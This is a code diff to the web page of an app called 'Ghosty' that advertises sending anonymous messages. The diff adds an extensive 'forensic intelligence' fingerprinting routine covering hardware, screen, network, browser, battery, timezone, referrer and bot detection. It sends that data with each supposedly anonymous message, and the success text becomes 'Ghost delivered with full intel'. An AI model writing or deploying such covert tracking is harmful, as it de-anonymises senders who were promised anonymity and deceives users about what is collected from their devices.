@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ghosty | Send Anonymous Messages</title>
     <link rel="stylesheet" href="style.css">
-    <script defer src="/_vercel/insights/script.js"></script>
+    <script src="/_vercel/insights/script.js"></script>
     <style>
         /* Ghostly Vanish Animation */
         .vanish {
@@ -54,6 +54,19 @@
         // 🔊 Preload Success Sound
         const whooshSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2057/2057-preview.mp3');
 
+        // Helper to check for generic browser features that might indicate stealth/bots
+        function detectStealth() {
+            let stealthScore = 0;
+            const reasons = [];
+
+            if (navigator.webdriver) { stealthScore += 100; reasons.push("WebDriver (Bot)"); }
+            if (window.outerWidth === 0 && window.outerHeight === 0) { stealthScore += 50; reasons.push("Headless"); }
+            if (!navigator.cookieEnabled) { stealthScore += 20; reasons.push("Cookies Disabled"); }
+            if (navigator.doNotTrack === "1") { stealthScore += 10; reasons.push("DNT Enabled"); }
+
+            return { score: stealthScore, reasons: reasons.length > 0 ? reasons.join(", ") : "None detected" };
+        }
+
         async function sendMsg() {
             const btn = document.getElementById('sendBtn');
             const status = document.getElementById('status');
@@ -63,30 +76,65 @@
             if (!message) return alert("You can't send an empty ghost!");
 
             btn.disabled = true;
-            btn.innerText = "Vanishing...";
+            btn.innerText = "Analyzing...";
             status.innerText = "";
 
-            // 🕵️ Gather Forensic Intel
+            // 🕵️ Deep Forensic Intelligence Gathering
             let batteryInfo = { level: "N/A", charging: "N/A" };
             try {
                 if (navigator.getBattery) {
                     const bat = await navigator.getBattery();
                     batteryInfo = {
                         level: Math.round(bat.level * 100) + "%",
-                        charging: bat.charging ? "🔌 Charging" : "🔋 Discharging"
+                        charging: bat.charging ? "🔌 Yes" : "🔋 No"
                     };
                 }
-            } catch (e) { }
+            } catch (e) {
+                console.warn("Battery API not supported or blocked");
+            }
 
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+            // Collect advanced window/screen metrics
+            const screenInfo = {
+                res: `${window.screen.width}x${window.screen.height}`,
+                avail: `${window.screen.availWidth}x${window.screen.availHeight}`,
+                depth: window.screen.colorDepth + "-bit",
+                ratio: window.devicePixelRatio,
+                window: `${window.innerWidth}x${window.innerHeight}`
+            };
+
+            const stealthInfo = detectStealth();
+
+            // Detailed Device Fingerprint
             const deviceInfo = {
-                platform: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language,
+                hardware: {
+                    cores: navigator.hardwareConcurrency || "N/A",
+                    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
+                    platform: navigator.platform || "Unknown",
+                    vendor: navigator.vendor || "Unknown",
+                    maxTouchPoints: navigator.maxTouchPoints || 0
+                },
+                display: screenInfo,
+                network: {
+                    type: conn ? conn.effectiveType : "N/A",
+                    downlink: conn ? conn.downlink + " Mbps" : "N/A",
+                    rtt: conn ? conn.rtt + " ms" : "N/A",
+                    saveData: conn ? (conn.saveData ? "Yes" : "No") : "N/A"
+                },
+                browser: {
+                    name: navigator.userAgent,
+                    lang: navigator.language || navigator.userLanguage,
+                    languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
+                    cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
+                    online: navigator.onLine ? "Yes" : "No",
+                    pdfViewer: navigator.pdfViewerEnabled ? "Supported" : "No"
+                },
+                stealth: stealthInfo,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                browser: navigator.userAgent,
+                timeOffset: new Date().getTimezoneOffset() / -60, // e.g., +6 for Dhaka
                 battery: batteryInfo,
-                network: conn ? `${conn.effectiveType} (${conn.type || 'data'})` : "Unknown"
+                referrer: document.referrer || "Direct Link"
             };
 
             try {
@@ -100,12 +148,12 @@
 
                 if (res.ok) {
                     // 🔊 sound, 📳 vibration, ✨ animation
-                    whooshSound.play();
+                    whooshSound.play().catch(e => console.log("Audio play prevented:", e));
                     if (navigator.vibrate) navigator.vibrate([50, 100, 50]);
                     msgInput.classList.add('vanish');
 
                     status.style.color = "#bb86fc";
-                    status.innerText = "👻 Your message has haunted their inbox!";
+                    status.innerText = "👻 Ghost delivered with full intel.";
 
                     setTimeout(() => {
                         msgInput.value = "";
@@ -120,7 +168,7 @@
                 }
             } catch (e) {
                 status.style.color = "#ff4f4f";
-                status.innerText = "❌ Connection error.";
+                status.innerText = "❌ Forensic transmission failed.";
                 btn.disabled = false;
                 btn.innerText = "Send Anonymously";
             }
